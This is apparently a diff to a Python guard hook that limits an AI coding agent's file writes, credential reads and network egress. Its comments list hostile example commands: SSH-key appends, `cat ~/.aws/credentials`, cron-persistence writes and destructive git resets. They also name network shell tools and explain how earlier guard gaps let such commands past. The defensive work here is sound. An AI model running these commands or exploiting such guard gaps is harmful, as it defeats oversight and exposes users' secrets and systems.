@@ -42,6 +42,7 @@ import re
 import shlex
 import subprocess
 import sys
+import tempfile
 from fnmatch import fnmatch
 from pathlib import Path
 from typing import Callable, Dict, List, Optional, Sequence, Tuple
@@ -67,6 +68,7 @@ __all__ = [
     "DIRECT_SQLITE_BLOCK_REASON",
     # 5 — D-ORCH-8 file access tiers
     "check_file_access_tiers",
+    "bash_file_targets",
     # 6 — unmerged remote-branch deletion
     "check_branch_deletion",
     "remote_branch_delete_targets",
@@ -75,13 +77,29 @@ __all__ = [
     "worktree_add_target",
     # 8 — review-loop pre-commit
     "check_review_loop_precommit",
-    # 9 — destructive git blocklist (headless path today; hgx-guard-02 wires it in)
+    # 9 — destructive git blocklist (both paths since exa-bench-06)
     "GIT_DANGER_PATTERNS",
     "git_danger_reason",
     "check_git_danger",
     # 10 — AGOV declarative agent rules, monitor-only by default (agov-det-06)
     "check_agent_rules",
     "reset_agent_gate",
+    # 11 — worktree write containment (exa-bench-07)
+    "check_write_outside_worktree",
+    "bash_write_targets",
+    "write_target_paths",
+    "sanctioned_write_roots",
+    "resolve_write_target",
+    "outside_write_root",
+    "reset_worktree_paths",
+    "SKIP_TARGET",
+    "UNRESOLVABLE_TARGET",
+    "WRITE_BOUNDARY_GUARD_ENV",
+    "WRITE_BOUNDARY_EXTRA_ROOTS_ENV",
+    # 12 — network egress, monitor-only by default (exa-bench-08)
+    "check_network_egress",
+    "egress_destinations",
+    "reset_egress_policy",
 ]
 
 
@@ -376,7 +394,48 @@ def check_direct_sqlite_usage(tool_name: str, tool_input: dict) -> Optional[str]
 _FILE_ACCESS_TIERS_CACHE: Dict[str, Optional[dict]] = {}
 
 _RM_TARGET_RE = re.compile(r"\brm\s+(?:-[a-z]*\s+)*([^\s|;&]+)")
-_REDIRECT_TARGET_RE = re.compile(r">\s*([^\s|;&]+)")
+
+#: Write redirections, and the target each one writes to.
+#:
+#: The previous pattern was ``>\s*([^\s|;&]+)``, which read an APPEND redirect
+#: wrong in a way that silently defeated the tiers: against
+#: ``echo k >> ~/.ssh/authorized_keys`` the first ``>`` matched, ``\s*`` matched
+#: nothing, and the capture group took the SECOND ``>``. ``file_path`` became the
+#: literal string ``">"``, which matches no tier pattern, so the append was
+#: ALLOWED — while the single-``>`` form of the same command was blocked.
+#:
+#: So the operator is now matched as a unit. ``(?<!>)`` starts the match at the
+#: FIRST ``>`` of a pair and ``>{1,2}`` consumes both, which is what the old
+#: pattern got wrong. Nothing needs to be said about the fd prefix — ``1>>``,
+#: ``2>>`` and ``&>>`` all just leave their prefix before the operator, so they
+#: are handled by the same two tokens, with or without a space before the path.
+#: ``(?!&)`` keeps fd duplication (``2>&1``) from reading as a write to a file
+#: named ``1``, and excluding ``>`` from the capture class stops a stray
+#: operator character being returned as a path again.
+_REDIRECT_TARGET_RE = re.compile(r"(?<!>)>{1,2}\s*(?!&)([^\s|;&>]+)")
+
+#: ``tee`` writes its target without any redirection operator at all, so the
+#: pattern above cannot see it. ``-a`` (append) and friends are skipped the same
+#: way ``_RM_TARGET_RE`` skips ``rm``'s flags.
+_TEE_TARGET_RE = re.compile(r"\btee\s+(?:-[a-zA-Z]+\s+)*([^\s|;&>]+)")
+
+
+def bash_file_targets(command: str) -> List[Tuple[str, bool, bool]]:
+    """Every path a Bash command writes to or deletes, as ``(path, write, delete)``.
+
+    Returns ALL of them rather than the first. A command redirects to more than
+    one file often enough (``a > log 2>> err``) that stopping at the first match
+    left the rest unexamined, and the tier check has to see each one to refuse
+    the call.
+    """
+    targets: List[Tuple[str, bool, bool]] = []
+    for match in _RM_TARGET_RE.finditer(command):
+        targets.append((match.group(1), False, True))
+    for match in _REDIRECT_TARGET_RE.finditer(command):
+        targets.append((match.group(1), True, False))
+    for match in _TEE_TARGET_RE.finditer(command):
+        targets.append((match.group(1), True, False))
+    return targets
 
 #: Inventories a tier may pull its patterns from via ``inherits:``. One name
 #: today; a dict rather than an ``if`` so adding a second is data, not control
@@ -543,56 +602,58 @@ def check_file_access_tiers(
     if not tiers:
         return None
 
-    file_path = ""
-    is_write = False
-    is_delete = False
+    # (path, is_write, is_delete) — a Bash command can name more than one.
+    targets: List[Tuple[str, bool, bool]] = []
 
     if tool_name in ("Read",):
-        file_path = tool_input.get("file_path", "")
         # Read — only blocked by zero_access
+        targets.append((tool_input.get("file_path", ""), False, False))
     elif tool_name in ("Edit", "Write", "MultiEdit", "NotebookEdit"):
-        file_path = tool_input.get("file_path", tool_input.get("notebook_path", ""))
-        is_write = True
+        targets.append(
+            (tool_input.get("file_path", tool_input.get("notebook_path", "")), True, False)
+        )
     elif tool_name == "Bash":
-        command = tool_input.get("command", "")
-        # A READ of a protected path. Checked first and returned immediately,
-        # because the two shapes below are both WRITE shapes: this branch used
-        # to inspect a command only for `rm` targets and `>` redirects, so a
-        # plain `cat ~/.aws/credentials` was never examined at all — the zero
-        # tier blocks the Read TOOL and says nothing about the shell
-        # (exa-bench-09). `env | grep -i key` is caught by the same call: it
-        # discloses a credential with no path for a path list to match.
-        reason = _bash_read_disclosure(command, repo_root)
+        targets.extend(bash_file_targets(tool_input.get("command", "")))
+
+    zero_patterns = [p for t in [tiers.get("zero_access", {})] for p in t.get("patterns", [])]
+    ro_patterns = [p for t in [tiers.get("read_only", {})] for p in t.get("patterns", [])]
+    nd_patterns = [p for t in [tiers.get("no_delete", {})] for p in t.get("patterns", [])]
+
+    for file_path, is_write, is_delete in targets:
+        if not file_path:
+            continue
+
+        # Zero access — block everything
+        if _matches_tier(file_path, zero_patterns):
+            return (
+                f"BLOCKED: File '{file_path}' is in zero_access tier (D-ORCH-8). "
+                "No access allowed."
+            )
+
+        # Read only — block writes and deletes
+        if (is_write or is_delete) and _matches_tier(file_path, ro_patterns):
+            return (
+                f"BLOCKED: File '{file_path}' is in read_only tier (D-ORCH-8). "
+                "Write/delete prohibited."
+            )
+
+        # No delete — block deletes only
+        if is_delete and _matches_tier(file_path, nd_patterns):
+            return (
+                f"BLOCKED: File '{file_path}' is in no_delete tier (D-ORCH-8). "
+                "Deletion prohibited."
+            )
+
+    # Read-disclosure LAST (exa-bench-09). The loop above only ever inspects
+    # WRITE shapes — rm targets, redirects, tee — so `cat ~/.aws/credentials`
+    # reaches it with no target at all and was never examined. Running it after
+    # the tiers rather than before keeps exa-bench-06's criterion intact: a `>>`
+    # into a zero_access path must still be refused BY THE TIERS, with the tier
+    # reason, rather than short-circuited by a message about credentials.
+    if tool_name == "Bash":
+        reason = _bash_read_disclosure(tool_input.get("command", ""), repo_root)
         if reason:
             return reason
-        # Check for rm/delete commands targeting protected files
-        rm_match = _RM_TARGET_RE.search(command)
-        if rm_match:
-            file_path = rm_match.group(1)
-            is_delete = True
-        # Check for write redirections
-        redir_match = _REDIRECT_TARGET_RE.search(command)
-        if redir_match and not is_delete:
-            file_path = redir_match.group(1)
-            is_write = True
-
-    if not file_path:
-        return None
-
-    # Zero access — block everything
-    zero_patterns = [p for t in [tiers.get("zero_access", {})] for p in t.get("patterns", [])]
-    if _matches_tier(file_path, zero_patterns):
-        return f"BLOCKED: File '{file_path}' is in zero_access tier (D-ORCH-8). No access allowed."
-
-    # Read only — block writes and deletes
-    ro_patterns = [p for t in [tiers.get("read_only", {})] for p in t.get("patterns", [])]
-    if (is_write or is_delete) and _matches_tier(file_path, ro_patterns):
-        return f"BLOCKED: File '{file_path}' is in read_only tier (D-ORCH-8). Write/delete prohibited."
-
-    # No delete — block deletes only
-    nd_patterns = [p for t in [tiers.get("no_delete", {})] for p in t.get("patterns", [])]
-    if is_delete and _matches_tier(file_path, nd_patterns):
-        return f"BLOCKED: File '{file_path}' is in no_delete tier (D-ORCH-8). Deletion prohibited."
 
     return None
 
@@ -855,9 +916,15 @@ def check_review_loop_precommit(
 # OPT-51 — adapted from mattpocock/skills/git-guardrails-claude-code (MIT). See
 # _ATTRIBUTION_REGISTRY in tools/workflow/coherence_checker.py.
 #
-# These commands can silently destroy work in a non-recoverable way. Today only
-# the headless path runs this check; hgx-guard-02 wires it into the Claude Code
-# hook too, at which point neither path is missing a rule the other has.
+# These commands can silently destroy work in a non-recoverable way.
+#
+# hgx-guard-02 moved the patterns here so both guard paths share one copy — but
+# only the HEADLESS path ever called the check. `.claude/hooks/pre_tool_use.py`
+# ::main() never did, so `git reset --hard origin/main` and `git clean -fdx` were
+# refused headlessly and ALLOWED in a Claude Code session, which is backwards:
+# the Claude Code session is the one running with the vendor permission system
+# turned off (D394). exa-bench-06 wired it into main() and added
+# tests/hooks/test_hook_parity.py, which asserts the two paths run the same set.
 
 GIT_DANGER_PATTERNS: Tuple[Tuple[str, str], ...] = (
     # Force push — direct or via shorthand
@@ -983,4 +1050,814 @@ def check_agent_rules(
     try:
         return gate.check_tool_call(tool_name, tool_input, root=_resolve_root(repo_root))
     except Exception:  # noqa: BLE001 — see docstring
+        return None
+
+
+# ── 11. Worktree write containment (exa-bench-07) ─────────────────────────
+#
+# MEASURED before this existed: on NO surface did anything assert that a write
+# lands inside the session's worktree. ``write_file`` to ``/etc/cron.d/pwn``,
+# ``~/.bashrc`` or ``../../sibling-repo/setup.py`` was allowed by
+# ``.claude/hooks/pre_tool_use.py`` and auto-allowed by
+# ``tools/agent_runtime/approval_gate.py``.
+#
+# The root cause is a rationale that does not survive leaving the repo:
+# ``args/agent_approval_policy.yaml`` tiers ``write_file`` ``recoverable`` on the
+# grounds that git or a checkpoint restores it. Git restores paths INSIDE the
+# repo. ``/etc/cron.d/pwn`` is recoverable by nothing.
+#
+# D-ORCH-8's ``args/file_access_tiers.yaml`` is a glob allow/deny list, not a
+# boundary — it enumerates bad paths but cannot express "anywhere but here". So
+# this check is its COMPLEMENT rather than an overlap: the tiers say which file,
+# this says where. Neither subsumes the other.
+#
+# Anchored on the CONTAINING WORKTREE, not the repo root. ``AgentSession.
+# working_dir`` is what ``claude_cli`` passes as the child's cwd, and it is a
+# worktree — so the main checkout is a *second* sanctioned root here rather than
+# the anchor, and ``os.getcwd()`` is never consulted (see the module preamble).
+
+WRITE_BOUNDARY_GUARD_ENV = "ICDEV_WRITE_BOUNDARY_GUARD"
+WRITE_BOUNDARY_EXTRA_ROOTS_ENV = "ICDEV_WRITE_BOUNDARY_EXTRA_ROOTS"
+
+#: :func:`resolve_write_target` verdicts that are not a path.
+SKIP_TARGET = "skip"                  #: not a file on disk — never a violation
+UNRESOLVABLE_TARGET = "unresolvable"  #: cannot be placed — treated as OUTSIDE
+
+#: Sinks that are not files. ``echo x > /dev/null`` is on the critical path of a
+#: great many ordinary commands and must never be read as a write to ``C:\dev``.
+_NULL_SINKS = frozenset({
+    "/dev/null", "/dev/zero", "/dev/tty", "/dev/stdin", "/dev/stdout",
+    "/dev/stderr", "/dev/fd/0", "/dev/fd/1", "/dev/fd/2",
+    "nul", "nul:", "con", "con:", "-",
+})
+
+#: ``C:\x`` / ``C:/x`` — absolute on Windows, and on POSIX a path into a
+#: filesystem this host does not have.
+_WINDOWS_ABS_RE = re.compile(r"^[A-Za-z]:[\\/]")
+#: ``C:x`` — drive-RELATIVE. Its meaning depends on the shell's per-drive cwd,
+#: which is exactly the state this module refuses to consult.
+_WINDOWS_DRIVE_RELATIVE_RE = re.compile(r"^[A-Za-z]:(?![\\/])")
+
+#: Home references a shell would expand but a raw string comparison would not.
+#: Deliberately narrow: these are the ones that reach a persistence surface
+#: (``$HOME/.bashrc``, ``%USERPROFILE%\\...``). Any OTHER unexpanded variable is
+#: left alone and therefore joins onto the worktree, i.e. resolves to ALLOWED —
+#: the fail-open direction, consistent with every neighbouring guard.
+_HOME_TOKENS = ("${HOME}", "$HOME", "%USERPROFILE%", "%HOMEPATH%")
+
+#: Tools whose input names a file they write.
+_WRITE_TOOL_NAMES = frozenset({
+    "write", "edit", "multiedit", "notebookedit",
+    "write_file", "append_file", "create_file", "patch_file", "edit_file",
+    "apply_patch", "str_replace_editor",
+})
+_WRITE_PATH_KEYS = ("file_path", "path", "notebook_path", "target_file", "filename")
+
+_SEGMENT_SPLIT_RE = re.compile(r"\|\||&&|[;|\n]")
+_ENV_ASSIGN_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")
+#: Wrappers that precede the real verb. Stripped so ``sudo mkdir /etc/x`` is
+#: still read as a ``mkdir``.
+_COMMAND_WRAPPERS = frozenset({
+    "sudo", "doas", "env", "nohup", "time", "command", "exec", "nice", "ionice",
+})
+#: Verbs where EVERY positional argument is created.
+_CREATE_VERBS = frozenset({"touch", "mkdir", "mkfifo", "truncate", "install"})
+#: Verbs where the LAST positional is the destination.
+_DESTINATION_LAST_VERBS = frozenset({"cp", "mv", "rsync", "ln"})
+_OUTPUT_FLAGS = {
+    "curl": ("-o", "--output"),
+    "wget": ("-O", "--output-document"),
+}
+
+
+def _unquote(token: str) -> str:
+    text = (token or "").strip()
+    for quote in ('"', "'"):
+        if len(text) > 1 and text[0] == quote and text[-1] == quote:
+            text = text[1:-1]
+            break
+    return text.strip()
+
+
+def bash_write_targets(command: str) -> List[str]:
+    """Every path a Bash command CREATES or WRITES.
+
+    A superset of :func:`bash_file_targets`' write half, because that function
+    exists for the D-ORCH-8 glob tiers and only needs the redirect/``tee``
+    forms. A boundary check needs the verbs that write without an operator —
+    ``touch``, ``mkdir``, ``cp``, ``dd of=`` — which is precisely how
+    ``touch /home/victim/.ssh/authorized_keys`` and ``mkdir -p /etc/cron.d/persist``
+    reached the disk unexamined.
+
+    Deletes are NOT included: ``rm`` outside the worktree is already refused by
+    :func:`check_dangerous_rm` and the ``no_delete`` tier, and folding them in
+    here would report one violation under two names.
+    """
+    targets: List[str] = [
+        path for path, is_write, _ in bash_file_targets(command or "") if is_write
+    ]
+
+    for segment in _SEGMENT_SPLIT_RE.split(command or ""):
+        segment = segment.strip()
+        if not segment:
+            continue
+        try:
+            tokens = shlex.split(segment, posix=(os.name != "nt"))
+        except ValueError:
+            tokens = segment.split()
+        # Leading `VAR=value` assignments and wrapper commands are not the verb.
+        while tokens and (
+            _ENV_ASSIGN_RE.match(tokens[0])
+            or os.path.basename(_unquote(tokens[0])).lower().removesuffix(".exe")
+            in _COMMAND_WRAPPERS
+        ):
+            tokens = tokens[1:]
+        if not tokens:
+            continue
+
+        verb = os.path.basename(_unquote(tokens[0])).lower().removesuffix(".exe")
+        rest = tokens[1:]
+        positional = [t for t in rest if not t.startswith("-")]
+
+        if verb in _CREATE_VERBS:
+            targets.extend(positional)
+        elif verb in _DESTINATION_LAST_VERBS and len(positional) >= 2:
+            targets.append(positional[-1])
+        elif verb == "dd":
+            targets.extend(
+                t[3:] for t in rest if t.lower().startswith("of=") and len(t) > 3
+            )
+        elif verb in _OUTPUT_FLAGS:
+            flags = _OUTPUT_FLAGS[verb]
+            for i, token in enumerate(rest):
+                if token in flags and i + 1 < len(rest):
+                    targets.append(rest[i + 1])
+
+    return [t for t in targets if t and t.strip()]
+
+
+def write_target_paths(tool_name: str, tool_input: dict) -> List[str]:
+    """Every path this tool call would write to, as the caller spelled it."""
+    if not isinstance(tool_input, dict):
+        return []
+    name = (tool_name or "").lower()
+    if name in ("bash", "shell"):
+        return bash_write_targets(tool_input.get("command", "") or "")
+    if name in _WRITE_TOOL_NAMES:
+        for key in _WRITE_PATH_KEYS:
+            value = tool_input.get(key)
+            if isinstance(value, str) and value.strip():
+                return [value]
+    return []
+
+
+def _main_checkout(anchor: Path) -> Optional[Path]:
+    """The main worktree's root, read from ``<anchor>/.git`` — no subprocess.
+
+    ``tools.git.worktree_paths.canonical_repo_root`` answers the same question by
+    shelling out to ``git rev-parse --git-common-dir``. That is the right call
+    there and the wrong one here: this runs before EVERY tool call, and a git
+    subprocess per call is a cost the guard cannot justify. A linked worktree's
+    ``.git`` is a file reading ``gitdir: <main>/.git/worktrees/<name>``, which
+    carries the same answer for one read.
+    """
+    dot_git = anchor / ".git"
+    try:
+        if not dot_git.is_file():
+            return None
+        text = dot_git.read_text(encoding="utf-8", errors="replace").strip()
+        if not text.startswith("gitdir:"):
+            return None
+        gitdir = Path(text.split(":", 1)[1].strip()).expanduser()
+        if not gitdir.is_absolute():
+            gitdir = anchor / gitdir
+        gitdir = gitdir.resolve()
+        for parent in gitdir.parents:
+            if parent.name == ".git":
+                return parent.parent
+    except (OSError, ValueError, RuntimeError):
+        return None
+    return None
+
+
+def sanctioned_write_roots(repo_root: Optional[Path] = None) -> Tuple[Path, ...]:
+    """Resolved roots a write may land in, most specific first.
+
+    * the session worktree (the anchor);
+    * the main checkout it is linked to — the same "git restores it" argument
+      that makes ``write_file`` ``recoverable`` holds there and only there;
+    * scratch: the platform temp dir, ``$TMPDIR``/``$TEMP``/``$TMP``, and the
+      literal ``/tmp`` and ``/var/tmp`` (on Windows a Git-Bash ``> /tmp/x``
+      really does land in ``C:\\tmp``, which CLAUDE.md documents);
+    * ``$ICDEV_WORKTREE_ROOT`` when an operator relocated the worktree base;
+    * ``~/.claude/projects`` — per-session agent state and memory. NOT
+      ``~/.claude`` itself: ``settings.json`` there wires the PreToolUse hook, so
+      a write to it edits this guard, which is the persistence surface the check
+      exists to refuse;
+    * anything in ``$ICDEV_WRITE_BOUNDARY_EXTRA_ROOTS`` (``os.pathsep``-joined).
+    """
+    roots: List[Path] = []
+
+    def add(candidate) -> None:
+        if not candidate:
+            return
+        try:
+            resolved = Path(candidate).expanduser().resolve()
+        except (OSError, ValueError, RuntimeError):
+            return
+        if resolved not in roots:
+            roots.append(resolved)
+
+    anchor = _resolve_root(repo_root)
+    add(anchor)
+    add(_main_checkout(Path(anchor).resolve()))
+    add(tempfile.gettempdir())
+    for var in ("TMPDIR", "TEMP", "TMP"):
+        add(os.environ.get(var, "").strip())
+    # nosec B108 -- not a temp file this code creates or writes. These are
+    # allowlist ROOTS: a Git-Bash `> /tmp/x` on Windows resolves to C:\tmp, and
+    # refusing that would break ordinary scratch work, which is how a guard gets
+    # switched off. Nothing here opens a path.
+    add("/tmp")      # nosec B108 -- see above
+    add("/var/tmp")  # nosec B108 -- see above
+    add(os.environ.get("ICDEV_WORKTREE_ROOT", "").strip())
+    try:
+        add(Path.home() / ".claude" / "projects")
+    except RuntimeError:
+        pass
+    for part in (os.environ.get(WRITE_BOUNDARY_EXTRA_ROOTS_ENV, "") or "").split(
+        os.pathsep
+    ):
+        add(part.strip())
+    return tuple(roots)
+
+
+def resolve_write_target(raw: str, anchor: Path):
+    """Resolve *raw* to an absolute path, or a sentinel.
+
+    ``..`` and symlinks are resolved BEFORE any comparison — a containment check
+    that compares strings is defeated by ``<worktree>/../../etc/passwd``, and one
+    that ignores symlinks is defeated by a link planted inside the worktree.
+
+    Returns :data:`SKIP_TARGET` for a non-file sink, :data:`UNRESOLVABLE_TARGET`
+    for a path that cannot be placed on this host, else a resolved
+    :class:`~pathlib.Path`.
+    """
+    text = _unquote(raw)
+    if not text or text.lower() in _NULL_SINKS:
+        return SKIP_TARGET
+
+    # `~` and the home variables a shell would have expanded. Done before the
+    # absolute-path tests so `$HOME/.bashrc` is judged as the home path it is.
+    for token in _HOME_TOKENS:
+        if text.startswith(token):
+            try:
+                text = str(Path.home()) + text[len(token):]
+            except RuntimeError:
+                return UNRESOLVABLE_TARGET
+            break
+
+    # UNC (`\\server\share`) names a host this check cannot reason about, and a
+    # drive-relative `C:x` means "the cwd OF DRIVE C", which is per-process shell
+    # state. Both are outside by construction rather than by comparison.
+    if text.startswith("\\\\") or _WINDOWS_DRIVE_RELATIVE_RE.match(text):
+        return UNRESOLVABLE_TARGET
+    # A Windows-absolute path evaluated on POSIX is not relative to the worktree
+    # — joining it onto the anchor would silently make `C:/Windows/...` INSIDE.
+    if os.name != "nt" and _WINDOWS_ABS_RE.match(text):
+        return UNRESOLVABLE_TARGET
+
+    try:
+        target = Path(text).expanduser()
+        if not target.is_absolute():
+            target = Path(anchor) / target
+        return target.resolve()
+    except (OSError, ValueError, RuntimeError):
+        return UNRESOLVABLE_TARGET
+
+
+_UNSET_WORKTREE_PATHS = object()
+_WORKTREE_PATHS: object = _UNSET_WORKTREE_PATHS
+
+
+def _worktree_paths(repo_root: Optional[Path]):
+    """``tools/git/worktree_paths.py``, or None. Loaded by path when ``tools``
+    is not already imported — same reason as :func:`_agent_gate`."""
+    global _WORKTREE_PATHS
+    if _WORKTREE_PATHS is _UNSET_WORKTREE_PATHS:
+        _WORKTREE_PATHS = None
+        try:
+            if "tools" in sys.modules:
+                from tools.git import worktree_paths  # noqa: PLC0415
+
+                _WORKTREE_PATHS = worktree_paths
+            else:
+                import importlib.util  # noqa: PLC0415
+
+                path = _resolve_root(repo_root) / "tools" / "git" / "worktree_paths.py"
+                spec = importlib.util.spec_from_file_location(
+                    "icdev_hook_worktree_paths", path
+                )
+                module = importlib.util.module_from_spec(spec)
+                sys.modules[spec.name] = module
+                spec.loader.exec_module(module)
+                _WORKTREE_PATHS = module
+        except Exception:  # noqa: BLE001 — an absent module must not stop the guard
+            _WORKTREE_PATHS = None
+    return _WORKTREE_PATHS
+
+
+def reset_worktree_paths() -> None:
+    """Drop the cached worktree_paths module. Tests only."""
+    global _WORKTREE_PATHS
+    _WORKTREE_PATHS = _UNSET_WORKTREE_PATHS
+
+
+def _is_relative_to(path: Path, other: Path) -> bool:
+    try:
+        path.relative_to(other)
+        return True
+    except ValueError:
+        return False
+
+
+def outside_write_root(
+    raw: str,
+    repo_root: Optional[Path] = None,
+    roots: Optional[Sequence[Path]] = None,
+) -> Optional[str]:
+    """The resolved target when *raw* lands outside every sanctioned root, else None."""
+    anchor = _resolve_root(repo_root)
+    target = resolve_write_target(raw, anchor)
+    if target is SKIP_TARGET:
+        return None
+    if target is UNRESOLVABLE_TARGET:
+        return raw
+    for root in roots if roots is not None else sanctioned_write_roots(repo_root):
+        if _is_relative_to(target, root):
+            return None
+    # The scratch roots tools/git/worktree_paths already sanctions — reused
+    # rather than restated, so the two cannot disagree about where a session is
+    # allowed to put things. repo_root is passed so it never shells out to git.
+    module = _worktree_paths(repo_root)
+    if module is not None:
+        try:
+            if module.is_sanctioned(target, repo_root=Path(anchor).resolve()):
+                return None
+        except Exception:  # noqa: BLE001 — a broken helper does not decide
+            pass
+    return str(target)
+
+
+def check_write_outside_worktree(
+    tool_name: str, tool_input: dict, repo_root: Optional[Path] = None
+) -> Optional[str]:
+    """Refuse a write whose RESOLVED target is outside the session worktree.
+
+    The boundary D-ORCH-8's glob list cannot express. ``args/file_access_tiers.
+    yaml`` can enumerate ``**/.ssh/*``; it cannot say "anywhere but here", so
+    every path nobody thought to enumerate — ``/etc/cron.d/pwn``, a sibling
+    checkout's ``setup.py`` — was allowed on every surface.
+
+    Sanctioned targets are the session worktree, the main checkout it is linked
+    to, the platform scratch dirs and whatever
+    :func:`tools.git.worktree_paths.is_sanctioned` already blesses; see
+    :func:`sanctioned_write_roots`.
+
+    ``ICDEV_WRITE_BOUNDARY_GUARD=0`` disables it, ``=monitor`` computes the
+    verdict and allows the call. Fails OPEN on any resolution error, like the
+    neighbouring guards — a guard that cannot resolve a path must not be the
+    reason a session cannot work.
+    """
+    if _off(WRITE_BOUNDARY_GUARD_ENV):
+        return None
+    try:
+        targets = write_target_paths(tool_name, tool_input)
+        if not targets:
+            return None
+        roots = sanctioned_write_roots(repo_root)
+        offenders = []
+        for raw in targets:
+            resolved = outside_write_root(raw, repo_root=repo_root, roots=roots)
+            if resolved is not None and (raw, resolved) not in offenders:
+                offenders.append((raw, resolved))
+        if not offenders:
+            return None
+        anchor = _resolve_root(repo_root)
+    except Exception:  # noqa: BLE001 — fail open on a broken guard, never on a match
+        return None
+
+    # Past this point the rule MATCHED, so it always blocks (or is explicitly in
+    # monitor mode). Nothing above may be allowed to throw us into the fail-open
+    # branch after a violation has been found.
+    if (os.environ.get(WRITE_BOUNDARY_GUARD_ENV, "").strip().lower()) == "monitor":
+        return None
+    detail = "\n".join(
+        f"    {raw}  ->  {resolved}" if raw != resolved else f"    {raw}"
+        for raw, resolved in offenders
+    )
+    return (
+        "BLOCKED: this write lands outside the session worktree.\n" + detail + "\n"
+        f"  worktree: {anchor}\n"
+        "  `write_file` is tiered `recoverable` in args/agent_approval_policy.yaml\n"
+        "  because git restores it — git restores paths INSIDE the repo. That is\n"
+        "  true for tools/foo.py and false for /etc/cron.d/pwn, which is\n"
+        "  recoverable by nothing.\n"
+        "  Write inside the worktree, or under a sanctioned scratch root:\n"
+        "    python -m tools.git.worktree_paths --path cli <slug>\n"
+        "  Deliberate: ICDEV_WRITE_BOUNDARY_GUARD=0 (off) or =monitor (record\n"
+        "  only); ICDEV_WRITE_BOUNDARY_EXTRA_ROOTS sanctions additional roots."
+    )
+# ── 12. Network egress (exa-bench-08) ─────────────────────────────────────
+#
+# Until this check existed the hook had no concept of the network at all. The
+# in-process agent loop did halt the obvious exfil commands, but only
+# incidentally: `approval_gate` escalates `curl -X POST` by pattern and catches
+# everything else because `default_tier: unknown` halts anything unenumerated.
+# Allowlisting one HTTP tool, or adding a `curl` downgrade pattern, would have
+# removed that silently. Nothing modelled the destination.
+#
+# The spawned CLI has none of that. `tools/agents/adapters/claude_cli.py` runs
+# with `--dangerously-skip-permissions` (ADR D394), so neither gate is in its
+# path — this hook is the only thing between that session and the network.
+
+_EGRESS_POLICY_CACHE: Dict[str, Optional[dict]] = {}
+
+#: Tools whose destination may be written as a bare host rather than a URL.
+#: Bare-hostname extraction is restricted to these because outside them a
+#: dotted token is overwhelmingly a filename (`README.md`, `tools/foo.py`).
+_BARE_HOST_TOOLS = frozenset(
+    {"nc", "ncat", "netcat", "socat", "telnet", "ssh", "scp", "sftp",
+     "rsync", "ftp", "lftp"}
+)
+
+_EGRESS_URL_RE = re.compile(
+    r"(?i)\b[a-z][a-z0-9+.\-]{1,15}://(?P<netloc>[^\s/?\#'\"`|;&()<>\\]+)"
+)
+
+#: Legal DNS presentation characters. Applied to every extracted host because
+#: the URL regex above happily captures an interpolation left half — measured:
+#: ``f"postgresql://{os.environ[...]}"`` yielded the "host" ``{os.environ[chr``.
+_DNS_CHARS_RE = re.compile(r"^[A-Za-z0-9](?:[A-Za-z0-9._\-]*[A-Za-z0-9])?$")
+
+#: Pipeline separators. Bare-host extraction is scoped to the segment whose
+#: PROGRAM is a bare-host tool, so an `ssh` mentioned inside a heredoc does not
+#: turn every dotted token in the command into a candidate hostname.
+_SEGMENT_SPLIT_RE = re.compile(r"\|\||&&|[|;&\n]")
+
+#: Leading words that precede the real program without being it.
+_COMMAND_PREFIXES = frozenset(
+    {"env", "sudo", "nohup", "time", "command", "exec", "unset", "export", "cd"}
+)
+
+#: A last label that is alphabetic and 2-24 chars. Deliberately not a TLD list:
+#: a stale list would silently stop seeing new gTLDs, and being slightly broad
+#: only over-reports in a monitor-only check.
+_TLD_LIKE_RE = re.compile(r"(?i)^[a-z]{2,24}$")
+
+#: Dotted tokens that pass the TLD shape but are near-always local files.
+_NOT_A_TLD = frozenset(
+    {"py", "md", "txt", "json", "yaml", "yml", "sh", "ps1", "sql", "log",
+     "csv", "html", "js", "ts", "tsx", "jsx", "css", "cfg", "ini", "toml",
+     "lock", "gz", "zip", "tar", "png", "jpg", "svg", "pdf", "exe", "dll",
+     "so", "db", "bak", "tmp", "orig", "rej", "patch", "diff", "env"}
+)
+
+
+def _read_egress_policy(root: Path) -> Optional[dict]:
+    """Uncached read of the egress policy. None when absent, unparsable or off."""
+    try:
+        import yaml  # noqa: PLC0415
+    except ImportError:
+        return None
+    config_path = root / "args" / "agent_egress_policy.yaml"
+    if not config_path.exists():
+        return None
+    try:
+        config = yaml.safe_load(config_path.read_text(encoding="utf-8"))
+        policy = (config or {}).get("agent_egress", {})
+        if not policy.get("enabled", False):
+            return None
+        return policy
+    except Exception:  # noqa: BLE001 — a broken policy must not stop the session
+        return None
+
+
+def _load_egress_policy(root: Path) -> Optional[dict]:
+    """Memoized per repo root — the hook process is short-lived (see #5)."""
+    key = str(root)
+    if key not in _EGRESS_POLICY_CACHE:
+        _EGRESS_POLICY_CACHE[key] = _read_egress_policy(root)
+    return _EGRESS_POLICY_CACHE[key]
+
+
+def reset_egress_policy() -> None:
+    """Drop the cached policy. Tests only."""
+    _EGRESS_POLICY_CACHE.clear()
+
+
+def _strip_host(netloc: str) -> str:
+    """Reduce a URL netloc to its bare host: drop userinfo, port, brackets."""
+    host = netloc.rsplit("@", 1)[-1]          # user:pass@host -> host
+    if host.startswith("["):                   # [::1]:443 -> ::1
+        end = host.find("]")
+        if end != -1:
+            return host[1:end]
+    return host.rsplit(":", 1)[0] if host.count(":") == 1 else host
+
+
+def _looks_like_hostname(token: str) -> bool:
+    """True for a dotted token whose last label has the shape of a TLD."""
+    if not token or "/" in token or "\\" in token:
+        return False
+    labels = token.rstrip(".").split(".")
+    if len(labels) < 2 or not all(labels):
+        return False
+    last = labels[-1].lower()
+    return bool(_TLD_LIKE_RE.match(last)) and last not in _NOT_A_TLD
+
+
+def _host_is_local(host: str) -> bool:
+    """True when *host* cannot carry data off this machine.
+
+    The IP-range test is the same partition ``tools/http/egress_guard.py``
+    makes, used with the OPPOSITE sign. That module is an SSRF guard: it
+    REFUSES loopback/RFC1918 so a confused fetcher cannot reach into the
+    internal network. Here those addresses are the safe case and a public one
+    is the risk, which is why it is reimplemented rather than imported —
+    ``tools/browser/scope.py`` already skips ``egress_guard`` for loopback for
+    this exact reason.
+    """
+    if not host:
+        return True
+    host = host.strip().rstrip(".").lower()
+    if not host:
+        return True
+    try:
+        import ipaddress  # noqa: PLC0415
+
+        ip = ipaddress.ip_address(host)
+    except ValueError:
+        pass
+    except Exception:  # noqa: BLE001
+        return False
+    else:
+        return bool(
+            ip.is_private or ip.is_loopback or ip.is_link_local
+            or ip.is_multicast or ip.is_reserved or ip.is_unspecified
+        )
+    if host == "localhost" or host.endswith(".localhost"):
+        return True
